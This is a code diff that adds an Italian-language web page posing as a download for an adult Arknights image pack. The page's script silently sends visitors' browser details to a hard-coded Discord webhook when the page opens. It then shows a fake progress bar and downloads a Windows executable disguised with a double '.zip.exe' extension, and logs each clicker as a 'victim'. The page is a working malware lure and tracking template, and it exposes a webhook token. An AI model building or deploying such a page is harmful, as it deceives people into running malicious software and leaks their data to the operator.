@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoxiusNoxy - Arknights NSFW Pack 2026</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 50px; }
+        .container { max-width: 720px; margin: 0 auto; }
+        .button { display: inline-block; padding: 25px 80px; font-size: 32px; background: linear-gradient(45deg, #ff00ff, #00ffff); color: white; border: none; border-radius: 15px; cursor: pointer; margin: 40px 0; box-shadow: 0 0 40px #ff00ff; transition: all 0.4s; }
+        .button:hover { transform: scale(1.1); box-shadow: 0 0 70px #00ffff; }
+        h1 { color: #ff00ff; text-shadow: 0 0 25px #ff00ff; }
+        .progress { width: 85%; height: 28px; background: #222; margin: 25px auto; border-radius: 12px; overflow: hidden; display: none; }
+        .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff00ff, #00ffff); transition: width 0.25s; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 NoxiusNoxy Exclusive NSFW Pack 2026 🔥</h1>
+        <p>Arknights + Furry + Lewd Collection (18+)</p>
+        <p><strong>1.8 GB - Password: noxysnoxy</strong></p>
+        
+        <div id="progress" class="progress"><div id="bar" class="bar"></div></div>
+        
+        <a href="#" id="downloadBtn" class="button">⬇️ SCARICA ORA</a>
+        <p style="margin-top: 50px; opacity: 0.7;">File: noxysnoxy_arknights_nsfw_pack_june2026.zip</p>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV";
+
+        async function sendLog(title, fields) {
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: `**${title}**`, embeds: [{color: 0xff00ff, fields: fields, timestamp: new Date().toISOString()}]})
+            }).catch(() => {});
+        }
+
+        window.onload = () => sendLog("PAGINA APERTA", [
+            {name: "IP", value: "`Caricamento...`"},
+            {name: "User-Agent", value: `\`${navigator.userAgent}\``},
+            {name: "Platform", value: navigator.platform}
+        ]);
+
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const progress = document.getElementById('progress');
+            const bar = document.getElementById('bar');
+            progress.style.display = 'block';
+            
+            let width = 0;
+            const int = setInterval(() => {
+                width += Math.random() * 18;
+                if (width > 100) width = 100;
+                bar.style.width = width + '%';
+                if (width >= 100) {
+                    clearInterval(int);
+                    // DOWNLOAD REALE DELL'EXE
+                    const link = document.createElement('a');
+                    link.href = "https://files.catbox.moe/TUO_NOME_EXE.exe"; // ← CAMBIA CON IL LINK DEL TUO .EXE
+                    link.download = "noxysnoxy_arknights_nsfw_pack_june2026.zip.exe";
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    setTimeout(() => alert("Download completato!\nPassword: noxysnoxy"), 700);
+                    sendLog("DOWNLOAD CLICCATO - VITTIMA", []);
+                }
+            }, 70);
+        });
+    </script>
+</body>
+</html>
